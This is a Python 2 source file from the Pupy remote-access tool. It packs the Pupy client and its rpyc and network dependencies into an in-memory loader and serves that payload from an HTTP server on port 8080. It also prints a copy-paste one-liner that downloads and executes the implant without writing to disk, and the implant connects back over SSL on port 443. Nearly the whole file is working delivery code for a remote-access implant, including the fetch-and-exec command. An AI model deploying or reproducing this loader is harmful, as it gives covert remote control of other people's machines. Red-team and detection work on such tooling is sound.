#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

#!/usr/bin/python
from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
import os.path
import cPickle
import rpyc
import re
from pupylib.utils.network import get_local_ip

ROOT=os.path.abspath(os.path.dirname(__file__))

def get_load_module_code(code, modulename):
	loader="""
import imp, sys
fullname={}
mod = imp.new_module(fullname)
mod.__file__ = "<bootloader>\\%s" % fullname
exec {} in mod.__dict__
sys.modules[fullname]=mod
	""".format(repr(modulename),repr(code))
	return loader

def gen_package_pickled_dic(path, module_name):
	modules_dic={}
	start_path=module_name.replace(".", "/")
	search_path=os.path.dirname(path)
	print "embedding %s ..."%os.path.join(search_path, start_path)
	for root, dirs, files in os.walk(os.path.join(search_path, start_path)):
		for f in files:
			module_code=""
			with open(os.path.join(root,f),'rb') as fd:
				module_code=fd.read()
			modprefix = root[len(search_path.rstrip(os.sep))+1:]
			modpath = os.path.join(modprefix,f).replace("\\","/")
			modules_dic[modpath]=module_code
	return modules_dic


def gen_payload():
	print "generating payload ..."
	fullpayload=[]
	with open(os.path.join(ROOT,"packages","all", "pupyimporter.py")) as f:
		pupyimportercode=f.read()
	fullpayload.append(get_load_module_code(pupyimportercode,"pupyimporter")+"\n")

	modules_dic=gen_package_pickled_dic(rpyc.__path__[0],"rpyc")
	fullpayload.append("import pupyimporter\npupyimporter.install()\npupyimporter.pupy_add_package(%s)\nimport rpyc"%repr(cPickle.dumps(modules_dic)))

	modules_dic=gen_package_pickled_dic(os.path.join(ROOT,"network"),"network")
	print os.path.join(ROOT, "network")
	fullpayload.append("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(modules_dic)))

	with open(os.path.join(ROOT,"pp.py")) as f:
		code=f.read()
	code=re.sub(r"LAUNCHER=.*\nLAUNCHER_ARGS=.*",CONFIG,code)
	fullpayload.append(code+"\n")
	
	return '\n'.join(fullpayload)+"\n"

class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):

	#Handler for the GET requests
	def do_GET(self):
		self.send_response(200)
		self.send_header('Content-type','text/html')
		self.end_headers()
		# Send the html message
		self.wfile.write(gen_payload())
		return

PORT=8080
CONFIG="""
LAUNCHER="simple"
LAUNCHER_ARGS=shlex.split("--host %s:443 --transport tcp_ssl")
"""%"127.0.0.1"#get_local_ip()

oneliner="python -c 'import urllib;exec urllib.urlopen(\"http://%s:%s/oneliner.py\").read()'"%(get_local_ip(), PORT)

if __name__=="__main__":

	print "copy/paste this one-line loader to deploy pupy without writing on the disk :"
	print " --- "
	print oneliner
	print " --- "


	try:
		server = HTTPServer(('', PORT), PupyPayloadHTTPHandler)
		print 'Started httpserver on port ' , PORT
		print 'waiting for a connection ...'

		#Wait forever for incoming htto requests
		server.serve_forever()

	except KeyboardInterrupt:
		print '^C received, shutting down the web server'
		server.socket.close()
